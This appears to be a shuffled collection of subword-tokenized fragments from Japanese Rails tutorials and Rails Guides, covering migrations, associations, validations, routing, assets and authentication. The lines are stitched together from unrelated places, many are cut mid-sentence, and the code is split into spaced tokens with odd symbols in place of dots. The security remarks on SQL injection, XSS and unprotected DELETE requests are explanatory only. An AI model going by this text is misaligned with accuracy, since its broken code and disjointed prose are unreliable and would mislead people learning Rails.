▁\ k ode {" 20 14 - 0 7-2 4 ▁00:57:46" } という タイムスタンプ が 気 になった 方 も い る と思います が 、 著者 はこの 箇所 を 真 夜 中 過 ぎ に 書いた わけではありません ▟ 実は この タイムスタンプ は \ href { http :// en ▖ w ikipedia ▖ org / wiki / Co or d in at ed _ U n ivers al _ Time } { 協 定 世界 時 ▁( UT C )} ▁ に合わせて あります ▟ これは \ href { http :// en ▖ w ikipedia ▖ org / wiki / Green w ic h _ M e an _ Time } { グ リ ニ ッ ジ 標準 時 ▁( G M T )} ▁ と同様 、 標準 時間 として 使用されます 。
▁@ user ▁= ▁User ▖ new
▁ 今後 の スタイル 要素を 利用 するために 、
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / array / extract _ options ▖ rb ` です 。
▁# ▁ SELECT ▁person _ id ▁FROM ▁people
▁create ▁app / views / users / show ▖ html ▖ erb
▁この マイグレーション を実行する コマンドは 以下の とおり です 。
▁( リスト \ ref { code : microposts _ interface _ test } では \ k ode { post } ▁followed ▁by ▁\ k ode { follow _ redirect !}
▁* ▁` config ▖ middleware ▖ insert _ before ( ex ist ing _ middleware , ▁new _ middleware , ▁ args ) ` ▁- ▁( 第 一 引数 で ) 指定された ミドルウェア の 前に 新しい ミドルウェア を追加します 。
▁これらの メソッドに 渡す 引数 は 、 レシーバ からの 相 対 的な 修 飾 済み 定数名 であること が 前提と なります 。
▁これらの API に依存し てしまう と 、 Rails を 次の リリース に アップグレード したときに アプリケーション や Gem が 壊 れる 危 険 性 があります 。
▁`: validate ` オプションを ` false ` に設定する と 、 関連付けられたオブジェクト は 保存 時に 検証 ( validation ) されません 。
▁ ブロック の 最後の 行 \ k ode { t ▖ timestamp s } は 特別な コマンドで 、\ k ode { created _ at } と \ k ode { updated _ at } という 2 つの 「\ emph { マジックカラム }」 を作成します ▟ これらは 、 ある ユーザーが 作成 または 更新 された ときに 、 その 時刻 を自動的に 記 録 する タイムスタンプ です
▁これは 完全に 有効な 方法 です 。
▁\ href { http :// www ▖ t hinkful ▖ com / a / railstutorial } { T hinkful } : ▁ プロ の エ ン ジ ニ ア と ペ ア を 組 んで 、 プロジェクト 実 践 型の カ リ キ ュ ラ ム で 進 んで い く オンライン 講 座 です 。
▁is ▁a ▁project ▁to ▁make ▁a ▁book ▁and ▁ screencasts ▁to ▁teach ▁web ▁development
▁module ▁A
▁| ▁PR IM A RY ▁| ▁4 ▁| ▁ const ▁| ▁1 ▁| ▁|
▁class ▁ Supplier ▁< ▁ActiveRecord :: Base
▁` url _ for _ options ` で 設定 された URL への アクションに 送信される フォーム タグ を作成します ▟ これは ` ActionController :: Base # url _ for ` と似ています 。
▁ 厳 密 には これは 正しい 表現 ではありません ▟ という の も 、 scaffold で生成した コード には ご く 簡単な テストが 一 応 含 まれ ている からです ▟ ただ 、 scaffold のテスト コードは データ 検証 や ユーザー 認 証 、 その他の 必要な 要求 を 満 た していません 。
▁### ▁config / environments / production ▖ rb
▁ ub section ▁current _ user ▁( end )╼╼ ▁\ subsection { レイアウト リンク を変更する } ▁% ▁( fold )╼ ▁\ label { sec : cha n g ing _ the _ layout _ links }╼╼
▁ タイトル に ERB コード を使用した About ページのビュー ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁デフォルトでは 、` stylesheet _ link _ tag ` によって 作成される リンク には ` media =" screen " ▁ rel =" stylesheet " ` という 属性 が含まれます 。
▁第 \ ref { cha : filling _ in _ the _ layout } 章 から 第 \ ref { cha : account _ activation _ and _ password _ reset } 章 に かけて 、 レイアウト 、 ユーザーの データモデル 、 ユーザー登録 / 認証システムを 順に 作成し 、 サンプルアプリケーションの 基本的な 部分を 実装します 。
▁続いて bcrypt を使用し 、\ k ode { cookies [: remember \_ token ]} が \ k ode { remember \_ digest } と 一致する ことを確認します ▁( リスト \ ref { code : user _ model _ remember }) 。
▁たとえば 、` constraints : ▁ { ▁ subdomain : ▁' api ' ▁}` という 制限 は ` api ` サブドメイン に 期待どおり マッチ します が 、` constraints : ▁ { ▁ subdomain : ▁: api ▁}` のように シンボル を使用した 場合は ` api ` サブドメイン に 一致し ません ▟ ` request ▖ subdomain ` が 返す ` ' api ' ` は 文字列 型 である ためです 。
▁ トピックブランチ の 削除 は 必 須 ではありません ▟ 実際 、 トピックブランチ を 削除 せずに そのまま に しておくこと は よく 行われ ています 。
▁このとき 参 照 先 の テーブル が 存在しない と 問題 が発生する 可能性があります 。
▁ 「 doc rails で 変更 して よい のは RDoc と ガイド のみ 」
▁その コードは Rails の コア に お く べ き ではない という フィードバック を受け た なら 、 gem の 形で リリース する 方が よい かもしれません 。
▁Relationship データモデル
▁Home ページ 上の 、 フォローしているユーザー / フォロワー の 統 計 情報 をテストする 。
▁customer ▖ orders ▖ empty ?
▁$ ▁git ▁remote ▁add ▁rails ▁git :// github ▖ com / rails / rails ▖ git
▁ 通常の コールバック は 、 Active ▁Record オブジェクト のライフサイクル の中で フック されます ▟ これにより 、 オブジェクトの さまざまな 場所 で コールバック を 実行 できます 。
▁この 演習 は \ ref { sec : contact _ page } の 節 に 解 答 があります 。
▁ エンジン にある ` config / routes ▖ rb ` ファイルに 以下の 記 述 を追加する ことで これを実現 できます 。
▁上のコード の場合 、 以下 が その 関数 です 。
▁( Cloud ▁IDE を使っている 場合は 、 図 \ ref { fig : sqlite _ download } のように まずは ファイルを お 手 元 に ダウンロード する必要があります ) 。
▁\ k ode { 0 ▖ ▖ 9 } ▁ は 範囲 として 有効 ですが 、 上の 2 番目の 表 記 では メソッド を呼ぶ 際に かっこ を追加する 必要がある ことを示しています 。
▁ 次は 、 一度 に すべての マイクロポスト が表示され てしまう 潜 在 的 問題 に 対 処 します 。
▁* ▁` extending `
▁\ k ode { scaffold } コマンド の 引数に は 、 リソース 名を 単数形 にした もの ▁( この場合は \ k ode { User }) ▁ を使用し 、 必要に応じて データモデル の 属性を オプション として パラメータ に追加します
▁Article ▖ joins ( comments : ▁: guest )
▁ 関連付けられている オブジェクト 同士 のいずれか 一 方が 検証 ( validation ) エラー で 保存 に 失敗する と 、 ア サ イン の 式 から は ` false ` が返され 、 ア サ イン は キャン セ ル されます 。
▁\ k ode { f ▖ object } は \ k ode {@ micropost } となります 。
▁ あ の 頃 は ユーザー登録 すら ありません でした が 、 今は 登録 も ログイン も ログアウト も できます ▟ プロフィール の表示 も 、 設定 の 編集 も 、 すべての ユーザーの 一覧 画面 もあります ▟ さらに 、 一部の ユーザーは 他の ユーザーを削除する こと すら できるようになりました 。
▁ 設定 の変更は その 場 で 反映され るので 、[ Save ] ▁ ボタン を クリック する必要はありません 。
▁ 通常 、 Rails は 適切な MIME タイプ を自動的に 生成 します 。
▁たとえば 以下の 宣言 を見てみましょう 。
▁ このテストは ▁\ passing \ ▁ するはずです 。
▁ 便 宜 上 、 リスト \ ref { code : micropost _ css } はこの 章で 必要な CSS を \ emph { すべて } 含 んで います 。
▁従って 、 アセット ファイル名 の 拡張子 は 、 これ に従って 処理 を行う べ き 順序 で 与 え る必要があります 。
▁------------ -
▁ とは い う もの の 今は 無 理 は 禁 物 です ▟ この テストでは また いくつか 新しい アイディア を 投 入 する 必要 も あるので 、 テスト 作成 は \ ref { sec : testing _ layout _ change s } に 回 す ことにします 。
▁get ▁' : controller / : action / : id / : user _ id '
▁ ついに 、 サンプルアプリケーションの 山頂 が 目 の 前に 現 れ ました ▟ 最後の 難 関 、 ステータスフィード の実装 に取りかかりま しょう 。
▁ ボタン クリック を ブロック で 囲 む ことによって 以下のように 1 行 で 表 しています 。
▁最後に 、\ k ode { create _ remember _ token } メソッドは 、 ユーザーの 属性 のひとつ に 「\ emph { 要素 代入 ▁( assignment ) }」 する必要があります ▟ この 文 脈 から 、\ k ode { remember _ token } の 前に \ k ode { self } キーワード を追加する 必要があります 。
▁ 以下のように 、 数値 を 人 間 にとって 読みやすい バ イ ト 数 形式で 単 位 が 単語 の 文字列に変換 できます 。
▁` N um er ic ` の拡張
▁` second `、` th ir d `、` f our th `、` f if th ` は 、 対応する 位 置 の 要素 を返します ▁( ` first ` は 元 から ビルトイン されています ) 。
▁has _ many ▁: ex p en s es , ▁ dependent : ▁: destroy
▁HTML 要素 と CSS クラスを 配置 した ことにより 、 プロフィール ページ ▁( と サイドバー と Gravatar ) ▁ に SCSS で リスト \ ref { code : sidebar _ css } のように スタイル を与える ことが できるようになりました
▁ ページ タイトル が正しく 表示 されない 問題 を解決する ために 、\ k ode { full \_ title } という ヘルパー を作成する ことにします 。
▁\ ref { sec : the _ flash } で実装した flash に対するテスト を書いて み てください 。
▁* ▁ 実装 が 楽 しい と 思える か 。
▁この 変更 による アプリケーション への 影 響 はほとんど ありません 。
▁もし Cloud ▁IDE や Linux ラ イ ク な システム 以外 で 開発 している のであれば 、 Google ▁ で ▁“ image magic k ▁< あなた の プラットフォーム 名 > ” ▁ と 検索 してください 。
▁また \ ref { sec : a _ hashed _ password } で 説明したように 、\ k ode { has \_ secure \_ password } を User モデルに 追加 した ことで 、 そのオブジェクト 内で \ k ode { authenticate } メソッドが 使える ようになっています 。
▁<%= ▁image _ tag ▁" home ▖ g if ", ▁size : ▁" 50 x 20 " ▁%>
▁$ ▁ subl ▁ ▖
▁ 理解 が 困難 。
▁このメソッド から 返 された リレーション に どのような 条件 を 連 鎖 させ ても 、 常に 空の リレーション が生成されます 。
▁### ▁HTTP 動詞 を 制限 する
▁` app / assets / javascripts / main ▖ js ` と ` app / assets / javascripts / photos / columns ▖ js ` を含め たい場合は 以下のように します 。
▁module ▁Your App
▁assemblies ▖ destroy ( object , ▁ ▖▖▖)
▁その ブロック の中で \ k ode { create _ table } メソッドは \ k ode { t } オブジェクト を使って 、\ k ode { name } と \ k ode { email } カラム を データベースに 作り ます ▟ 型 は どちらも \ k ode { string } です
▁ バリデーション が 失敗する たびに 、 オブジェクトの ` errors ` コレクション に エラーメッセージ が追加され 、 その メッセージ は 、 バリデーション が 行われ る 属性 に 関連付け られます 。
▁上のコード のうち 、 以下の行 は
▁4 ▁examples , ▁1 ▁failure
▁class ▁Create Supplier s ▁< ▁ActiveRecord :: Migration
▁ これはリスト \ ref { code : gemfile _ sample _ app } で使用されていました 。
▁たとえば 次のように コメント します 。
▁ このため 、\ k ode { if ▁request ▖ get ?} という 条件 文 を使って この ケース の 対策 しています
▁ ビデオ タグ では 、` < video >` ▁HTML オプションを 以下のような HTML オプション ハッシュ 形式で 指定することもできます 。
▁### ▁` find _ or _ create _ by `
▁ インストール した Git を使用する 前に 、 最初に 1 回 だけ 設定 を行う 必要があります 。
▁また 、\ ref { sec : updating _ user _ objects } で紹介した \ k ode {@ user ▖ reload } を使って 、 データベースから 最新の ユーザー情報 を 読み込み 直 して 、 正しく 更新 された かどうかを確認 している 点 にも 注 目 してください 。
▁#### ▁` has _ one ` で 追加される メソッド
▁\ ref { sec : hashes _ and _ symbols } では \ emph { ハッシュ } とは Ruby の データ構造 である と 説明しました が 、 今回の 「 ハッシュ化 」 とは そう い った 構造 ではなく 、\ href { http :// en ▖ w ikipedia ▖ org / wiki / Hash _ function } { ハッシュ 関数 } を使って 入力 された データを 元に戻 せ ない ▁( 不可 逆 な ) ▁ データ にする 処理 を指します ▟)
▁class _ name
▁< p > Welcome !
▁\ ref { sec : static _ pages } でも 簡単に 説明しました が 、 上のコード のは 継 承 のための Ruby の ▁\ k ode { Word ▁< ▁ String } ▁ 記 法 です ▟ こうすることで 、 新しい \ k ode { palindrome ?} メソッド だけ ではなく 、 String クラス で 使用できる すべての メソッドを Word クラス に対して も 使用 できるようになります 。
▁上の コミット 〜 プッシュ の 流れ は 、 著者 が 実際の 開発 で よく 使って いた パターン に基づいて います が 、 ここ から 先 は 途中 で このような 指示 を い ち い ち 書くこと は しません ので 、 各 自 こ ま め に プッシュ するようにしてください 。
▁ シングルクォート は 、 入力 した 文字 を エスケープ せずに 「 そのまま 」 保 持 するときに 便利です 。
▁ パーシャル ファイル名 の冒頭 には アンダースコア が 付 い ている ことにご注意ください ▟ これは 通常の ビュー と 区別 するために 付け ら れ ています ▟ ただし render で 呼び出す 際に はこの アンダースコア は 不要 です 。
▁ これはリスト \ ref { code : sample _ app _ readme } で使用されていました 。
▁デフォルトは ` ' http ▁authentication ' ` です 。
▁\ \ ▁\ file path { app / helpers / application \_ helper ▖ rb } } ╼ %= ▁ lang : ruby ╼\ begin { code } ╼ module ▁Application Helper ╼╼
▁ここでは 、 サイトの ルート URL ▁< http :// localhost : 3 000 > ▁ にアクセス したときに この メッセージ が表示される ようにします 。
▁` object ` オプション と ` as ` オプションは 同時に 使用 することもできます 。
▁\ k ode { create } アクション の \ k ode { User ▖ new } ▁( リスト \ ref { code : signup _ flash }) で 期 待 されている データを 、\ k ode { params [: user ]} という ハッシュ に まとめ ています 。
▁INFO : ▁` underscore ` メソッド の動作 は 、` camelize ` メソッドと 逆 の動作 と 考え ると わかりやす い でしょう ▟ ただし 完全に 逆 の動作 ではありません 。
▁Active ▁Record ▁ では \ emph { 検証 ▁( V al id ation )} ▁という 機能 を通して 、 こういった 制 約 を 課 す ことができる ようになっています ▁( 実は \ ref { sec : putting _ the _ micro _ in _ microposts } で 少しだけ 使って いました ) 。
▁今度は データベース を 覗 いて 、 新規ユーザー が 確 か に 登録 されている ことを ダブルチェック しましょう 。
▁たとえば 、 著者 の システム では 以下の どちら でも 動く ようになっています ▁( クラウド IDE と ローカル サーバー で 使い 分 け ています ) 。
▁ パスワードが 空 のまま でも 更新 できるように する ▁GR EEN {2}{3}{/3}{3}{4} {/4}{/3}{3}{/3} {/2}
▁### ▁i 18 n を設定する
▁* ▁Rails のインストール 方法 、 新しい Rails アプリケーションの 作成 方法 、 アプリケーション から データベース への 接続 方法
▁ レイアウト が 整 えられ ていない 。
▁### ▁CSS インジェクション
▁* ▁` collection ▖ create !(
▁ここで Sass の \ emph { ミックスイン } 機能 ▁( ここでは \ k ode { box \_ sizing }) ▁ を使用しています 。
▁`: instance _ reader ` を ` false ` に 設定 すれば 、 reader インスタンス メソッドは 生成 されません 。
▁ こう しておく と より 多くの メッセージ を 生成 でき 、 サ イ レ ン ト エラーを 回 避 できる ので デバッグ が 容易に なります 。
▁# ▁ 変更 不要 : PATCH が望ましい が PUT も 使用できる
▁* ▁ 環境 に応じた 設定ファイル
▁これ を修正する ためには 、 ユーザー id に対する バリデーション を追加する 必要があります ▁( リスト \ ref { code : micropost _ user _ id _ validation }) 。
▁config ▖ assets ▖ digest ▁= ▁false
▁< div > <%= ▁submit _ tag ▁' Save ' ▁%></ div >
▁\ ref { sec : signup _ form } では HTML ▁\ emph { フォーム } を使用して 登録 情報を Web アプリケーションに 送信 します ▟ 続いて \ ref { sec : successful _ signup s } では ユーザーを 新規 作成 して 情報を データベースに保存 します 。
▁$ ▁ cd ▁~/ workspace /
▁#### ▁number _ with _ precision
▁ただし その前に 、 完了 させ て お か なければならない 作業 が 2 つ あります 。
▁ ユーザーが メールの リンクを クリック したら 、 アプリケーションは メールアドレスを キー に して ユーザー を探し 、 データベース 内に 保存 して お いた 有効化 ダイジェスト と 比 較 することで トークン を 認 証 する 。
▁もし メールアドレスが 既に 使用されている という メッセージ が表示され たら 、 { p 0} で や った ように Rake の {2} db : migrate : reset {/2} を実行して データベースをリセットし てください 。
▁Action ▁Mailer ▁ 3▖0 は ファイルを インライン 添付 できます ▟ この 機能 は 3▖0 より 前に 行われた 多数の ハ ッ ク を 基 に 、 理想 に 近 づ け る べ く シンプルな 実装 にした ものです 。
▁ユーザーの 作成 、 表示 、 編集 方法 について 説明しました ので 、 今度は ユーザーを削除 してみましょう ▁( 図 \ ref { fig : demo _ destroy _ user }) 。
▁ これはリスト \ ref { code : rails _ routes _ root _ route } で使用されていました 。
▁ 結果 として 、 管理者 だけ が ユーザーを削除 できるようになります ▁( より 具体的には 、 削除リンク が 見え ている ユーザー のみ 削除 できる )▟ しかし 、 実は まだ 大きな セキュリティホール があります ▟ ある程度 の 腕 前 を持つ 攻撃者 なら 、 コマンドラインで \ text tt { DELETE } リクエスト を直接 発行する という 方法で サイトの 全 ユーザーを削除 してしまう ことができる でしょう 。
▁### ▁ コントローラ 固有の アセット
▁Rails には 、 rake コマンドライン ユーティリティ を使用して 生成 できる ビルトイン ヘ ル プ もあります 。
▁この章では 、 ▁ 主 に \ ref { sec : static _ pages } で紹介した サイト ロゴ 、 ナビゲーション ヘッダー 、 サイト フッター を含む 静的ページ を 開発 します 。
▁続いて 、 マイクロポスト を検索する 機能 も 追加 してください 。
▁* ▁ compiled ▁file , ▁but ▁it ' s ▁generally ▁better ▁to ▁create ▁a ▁new ▁file ▁per ▁style
▁Client ▖ order (" created _ at ▁DESC ")
▁上の 例 の 整 数 は 、` id ` への 呼び出し によって 取り 出 された もの と 考え られます 。
▁ 本書 を 読み 終 え る 頃 には 、 本書 を 読む 前の 知識 量 の 多少 にかかわらず 、 より 高度な Rails の 情報 源 を 理解 できるように な っている はずです 。
▁Windows の場合 、 Linux が動作する 仮 想 マシン を用意し て 、 その 仮 想 マシン 上で Rails アプリケーションを開発する ことが 好 まれ ています ▟ この場合 、 お勧め の コマンドライン は 上 記 と 変わりません 。
▁ どう しても 必要であれば 、 ホワイトリスト ベースの CSS フィルタ として Rails の ` sanitize () ` メソッド を使用することもできます 。
▁belongs _ to リレーションシップ の場合 、 Active ▁Record オブジェクトが 値 として 使用 され ていれば 、 モデル を指定する 時に 関連付け キー を使用できます 。
▁def ▁update
▁# ▁ 実行 前に 行なう 作業
▁` strip _ her e doc ` メソッドは 、 ヒ ア ドキュメント の インデント を 除 去 します 。
▁# ▁ 元の テンプレート に " !" を追加する
▁\ label { table : RESTful _ microposts } }╼\ end { table }╼╼ ▁\ subsection { マイクロポストの アクセス制御 } ▁% ▁( fold )╼ ▁\ label { sec : micropost _ access _ control }╼╼
▁ トラフィック の 多 い 本番 サイト では 、 変更 を行う 前に 以下のように \ href { https :// dev center ▖ heroku ▖ com / articles / maintenance - m ode }{\ emph { メ ン テ ナ ン ス モード } } をオンに して おくとよいでしょう 。
▁ これはリスト \ ref { code : micropost _ validations } で使用されていました 。
▁ 本 文 および リスト \ ref { code : failed _ login _ attempt } の コメント で 述べたように 、 このコード には 誤り があります 。
▁しかし これは Web アプリケーション にとって は 新 た な 脅威 となる かもしれません ▟ 異なる コード で エンコード された 中に 、 ブラウザで は 処理 可能 だ が サーバー では 処理 されない ような 悪意のある コードが 潜 んで い る か もし れ ない からです 。
▁master や doc rails への 貢献 が 認 め られた 方 々 は [ Rails コ ン ト リ ビュー タ ]( http :// contributors ▖ rubyonrails ▖ org ) に その 名を 連 ね ています 。
▁<%= ▁form _ for ▁@ article ▁do ▁| f | ▁%>
▁**` Rack :: ETag ` **
▁╼╼\ end { enumerate }╼╼ ▁% ▁subsection ▁user _ micropost _ associations ▁( end )╼╼ ▁\ subsection { マイクロポストを 改良 する } ▁% ▁( fold )╼ ▁\ label { sec : ordering _ and _ dependency }╼╼
▁ { puts }) ▁a ▁string ▁consist ing ▁of ▁the ▁c ity ▁and ▁state ▁separate d ▁by ▁a ▁ com ma ▁and ▁as ▁ space , ▁as ▁in ▁`` L o s ▁An ge le s , ▁C A '' ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 76 8 a 7 4 ' ></ span >╼╼ ▁\ item ▁R epeat ▁the ▁previous ▁exercise ▁but ▁with ▁the ▁c ity ▁and ▁state ▁separate d ▁by ▁a ▁ tab ▁character ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 5 4 f c 6 5 ' ></ span >╼╼ ▁\ item ▁What ▁is ▁the ▁result ▁if ▁you ▁replace ▁double ▁ quot es ▁with ▁single ▁ quot es ▁in ▁the ▁previous ▁exercise ? ╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 48 20 a 5 ' ></ span >╼ \ end { enumerate }╼╼ ▁\ subsection { オブジェクト と メッセージ 受 け 渡 し } ▁% ▁( fold )╼ ▁\ label { sec : objects _ and _ message _ passing }╼╼
▁self を省略した 結果を リスト \ ref { code : micropost _ model _ image _ validation } に示します 。
▁この 「\ text tt { ||= } 」( or ▁equal s ) ▁という 代入 演算子 は Ruby で 広 く 使用されている イ デ ィ オ ム であり 、 Ruby 開発者 を 志 す なら この 演算子 に 習 熟 すること が重要です 。
▁ ディレクトリ の作成
▁" author _ id "▖ humanize ▁# ▁=> ▁" A u th or "
▁module ▁ Billing
▁ パーシャル を ビュー の一部 に含め て 出力する には 、 ビュー 内で ` render ` メソッドを使用します 。
▁Web アプリケーションの ディレクトリ を どう 構成 するか は 本 来 自 由 なのです が 、 Rails のような Web フレームワーク では ディレクトリ と ファイルの 構造 ▁({0}{1} 図 1 ▖ 4 {/1}{/0} ) ▁ は このように 標準 化 されています ▟ その おかげで 、 ディレクトリ 構成 に 悩 む こと なく 、 実際に 動作する アプリケーションを 即座に ゼロ から 作成 できる のです 。
▁ 具体的には リスト \ ref { code : name _ presence _ test } のように 、 まず \ k ode {@ user } 変数 の \ k ode { name } 属性 に対して 空白 の 文字列を セット します ▟ そして 、\ k ode { assert \_ not } メソッドを使って ▁User オブジェクトが 有効 で なく な った ことを確認します 。
▁ 単数形 の リソースフルな ルーティング を使用すると 、 以下の ヘルパーメソッド が生成されます 。
▁ここで 、 いつものように 開発環境 用の データベース で 再度 サンプルデータを 生成 します 。
▁たとえば 以下のように 、 配列 を作成し 、2 番目の 変数 を その 配列 に 代入 してから 、\ k ode { reverse !} メソッドを使用して 最初の 配列 を 逆 順に すると します 。
▁#### ▁text _ area _ tag
▁To p ic ▖ create ( title : ▁" ")▖ valid ?
▁“ following ” は 表示 で ▁“ 50 ▁following , ▁7 5 ▁followers ” ▁ のように 使用する ことは あります が 、 データモデル としては 違 う 名前 を使用する ことにしましょう ▟ ここでは 、 フォローしているユーザー た ち 自体 を表す の に ▁“ followed ▁users ” ▁ を採用する ことに し 、 これ に \ k ode { user ▖ followed _ users } 配列 が 対応 します
▁$ ▁bundle ▁exec ▁rake ▁test ▁TEST = test / integration / users _ login _ test ▖ rb ╼ $ ▁bundle ▁exec ▁rake ▁test
▁ここまで でき れば 、 以下のように 呼び出す ことで \ k ode { authenticated ?} の 従来 の 振 舞 い を再 現 できます 。
▁ ある モジュール が 無名 で あった ら どう なる か 。
▁# ▁=> ▁[1, ▁2, ▁3]
▁< div ▁class =" field ">
▁` has _ one ` 関連付け も 、 他 方のモデル と の 間 に 1 対 1 の関連付け を設定します ▟ しかし 、 その 意味 と 結果は ` belongs _ to ` とは 若 干 異なります 。
▁( Factory ▁Girl は テスト 環境で しか 使用 し ないので 、 以下のように \ k ode { : test } グループ に追加します ) 。
▁上の 行 は 、 Capybara の \ k ode { visit } 機能 を使って 、 ブラウザで の \ k ode { / static _ pages / home } URL へのアクセス を シ ミ ュ レ ー ション します 。
▁self を省略した 結果を リスト \ ref { code : f _ error _ messages } に示します 。
▁to ▁h ide ▁all ▁images ▖ } ╼ %= ▁ lang : css ╼\ begin { code } ╼ img ▁ { ╼ ▁display : ▁ none ; ╼ }╼\ end { code }╼\ end { code listing }╼╼ ╼ ▁% ▁subsection ▁custom _ css ▁( end )╼╼ ▁\ subsection { パーシャル ▁( partial )} ▁% ▁( fold )╼ ▁\ label { sec : partial s }╼╼
▁ 画像アップロード に対するテスト は 、 演習 に回します ▁(\ ref { sec : exercises _ basic _ image _ upload }) 。
▁ ヘッダー の中で もっと も 重要なのは ` Cache - Control ` です ▟ これは CDN ▁( および Web ブラウザ ) ▁ に キャッシュ の 取り 扱 い 方法を 通知 する ためのものです 。
▁#### # ▁`: dependent `
▁\ emph { 私 です ら } それらの クラス の詳細 について 知 らない ことが たくさん あります し 、 それ でも 私 は 200 5 年 から Ruby ▁on ▁Rails で 問題 なく プログラミング でき ています 。
▁ ここ から 、2 つの 疑 問 が生じ ます ▟ 1 ▖ ▁ ある ユーザーが 別の ユーザーを フォロー するとき 、 何 が 作成される のでしょうか 。
▁#### ▁ 単 一 のテスト を実行する
▁\ href { https :// www ▖ code school ▖ com /}{ Code ▁School } : ▁ プログラミング を対話的に 学習 できる コース
▁` content _ for ` メソッドは 、 たとえば レイアウト が 「 サイドバー 」 や 「 フッター 」 などの 領 域 に 分 か れ て いて 、 それら に 異なる コンテンツ を挿入 したい ような 場合に 大 変 便利です 。
▁リスト \ ref { code : cat _ public _ key } に示したように 、 クラウド IDE を使用し ていれば \ k ode { cat } コマンドで 公開鍵 を 表示 できる ので 、 それを 選択 、 コピー します 。
▁ メールアドレス は 大文字 と 小文字 を 区別 しません が ▁(\ ref { sec : format _ validation }) 、 M D 5 ハッシュ では 大文字 と 小文字 が 区別 される ので 、 Ruby の \ k ode { downcase } メソッドを使用して \ k ode { hexdigest } の 引数 を 小文字 に変換 しています 。
▁ 引数 付き スコープ の 呼び出し は 、 クラスメソッド の 呼び出し と 同様の方法で 行います 。
▁このとき 、 出力 された HTML が Rails によって エスケープ される の を防ぐ ために \ k ode { raw } メソッド を使用してください ▟ また 、 クロスサイトスクリプティング ▁( XSS ) ▁ を防ぐ ために \ k ode { sanitize } メソッド も 使用 してください 。
▁Gemfile に記載されている Rails のバージョン を 更新 後 、 この rake タスク を実行し てください 。
▁<%= ▁stylesheet _ link _ tag ▁" application " ▁%>
▁上のコードでは 、 Rails は自動的に は て な マーク ▁" ? " ▁ を \ k ode { about \_ path } に 置 換 しています ▁( このとき ▁" about \_ path " ▁ 内に 特 殊 記 号 があれば エスケープ 処理 されます )▟ これにより 、 次のような HTML があるかどうかをチェック することができます 。
▁I ▁shall ▁be ▁late ▖▖▖"
▁たとえば 、\ k ode { create } アクション で \ k ode {@ user } という インスタンス変数 が 定義され ていれば 、 テスト 内部で は \ k ode { assigns (: user )} と 書くこと で インスタンス変数 にアクセス できます 。
▁xml ▖ link (@ person ▖ fi rm ▖ account ▖ url ▁+ ▁@ recent _ items ▖ url ( item ) )
▁* ▁` find _ or _ initialize _ by _▖▖▖` ▁ に代えて ` find _ or _ initialize _ by (▖▖▖) ` を使用
▁def ▁file _ s ha ( path )
▁ 部分 テンプレート は 通常 単 に パーシャル と呼ばれ ます ▟ パーシャル は 、 上 とは 異なる 方法で レンダリング 処理を 扱 い やすい 単 位 に 分割 するための しく み です 。
▁#### ▁stylesheet _ url
▁リスト \ ref { code : following _ followers _ action s } にある アクションは 、2 通り の 方法で リスト \ ref { code : show _ follow _ view } の ビュー を呼び出します ▟ “ following ” を と お って 描画 した ビューを 図 \ ref { fig : user _ following } に 、 “ followers ” を と お って 描画 した ビューを 図 \ ref { fig : user _ followers } に示します 。
▁See ▁the ▁\ href { http :// dev center ▖ heroku ▖ com /}{ Heroku ▁documentation } ▁for ▁more ▁information ▁about ▁custom ▁domain s ▁and ▁other ▁Heroku ▁topic s ▖
▁* ▁` 関連付け 名 _ type ` ▁- ▁[ ポリモーフィック関連付け ]( association _ basic s ▖ html # ポリモーフィック関連付け ) の種類 を 保存 します
▁edit _ article ▁GET ▁ / articles / : id / edit (▖ : format ) ▁articles # edit
▁ 具体的な シナリオ を使って その 問題 を 説明します 。
▁ ログイン 成功 後 のユーザー プロフィール画面 のモックアップ
▁` app / views / comments / _ form ▖ html ▖ erb ` ファイルを作成し 、 以下のように 入力 します 。
▁この タグ を使用して 、 環境変数 から 接続 情報 を取り出し たり 、 接続 情報 の 生成 に必要な 計算 を行なう こともできます 。
▁c ▖ locked ▁= ▁false
▁ NoMethodError : ▁undefined ▁method ▁` empty ? '
▁このオプション は 引数に \ emph { 正規表現 ▁( Regular ▁E x press ion )} ▁(\ emph { regex } とも 呼 ば れ ます ) ▁ を 取り ます ▟ 正規表現 は 一見 謎 め いて 見え ますが 、 文字列 の パターン マッチ ング において は非常に 強力な 言語 です 。
▁### ▁ インスタンス変数
▁# ▁ Blog ▖ all ▖ to _ formatted _ s ▁# ▁=> ▁" First ▁P o st Second ▁P o st Third ▁P o st "
▁### ▁C a p t ure Helper
▁最初に 、 使用する エンジン を アプリケーションの ` Gemfile ` に記述 する必要があります 。
▁ これまで は コンソール 上で クラス を定義し ましたが 、 このような 面倒な 作業 は もう 行 いた く ありません ▟ これ から は 、 アプリケーションのルート ディレクトリに \ k ode { example \_ user ▖ rb } ファイルを作成し 、 そこに リスト \ ref { code : example _ user } のように 書く ことにします 。
▁" staging " 環境 を サーバー に追加し たい のであれば 、` config / environments / staging ▖ rb ` という ファイル を作成する だけで済みます 。
▁ 詳 しく は \ ref { sec : professional _ grade _ deployment } で 解説します ) 。
▁WARNING : ▁ 条件 を 文字列 だけで 構成 すると 、 SQL インジェクション の 脆弱性 が発生する 可能性があります 。
▁As ▁long ▁as ▁you ▁re tain ▁this ▁notice ▁you ╼ ▁* ▁can ▁do ▁what ever ▁you ▁want ▁with ▁this ▁ stuff ▖
▁もちろん 、 余 計 な ことを 一 切 考え ずに 、 シンボル を 単 なる 文字列 と み な しても構いません
▁今回の場合 、 デバッグ 出力 は 図 \ ref { fig : home _ page _ with _ debug } のようになります 。
▁ これまで 、 リスト \ ref { code : generate _ user _ model } の User モデルの 作成 によって どのように ▁( リスト \ ref { code : generate _ user _ model } の ) ▁ マイグレーション ファイルが 作成される か を見 てきました ▟ そして 図 \ ref { fig : sqlite _ database _ browser } で この マイグレーション を 実行 した結果 を見 ました ▟\ k ode { users } テーブル を作成する ことで 、\ k ode { development ▖ sqlite 3 } という 名 の ファイル を更新し 、\ k ode { id }、\ k ode { name }、\ k ode { email }、\ k ode { created \_ at }、\ k ode { updated \_ at } を作成し ました 。
▁# ▁ 試 作 feed の定義
▁上の 正規表現 には 少しだけ 残 念 な 点 があります ▟\ k ode { foo @ bar ▖ ▖ com } のような ドット の 連続 を 誤り として 検出 できません 。
▁Article ▖ created _ before ( Time ▖ zone ▖ now )
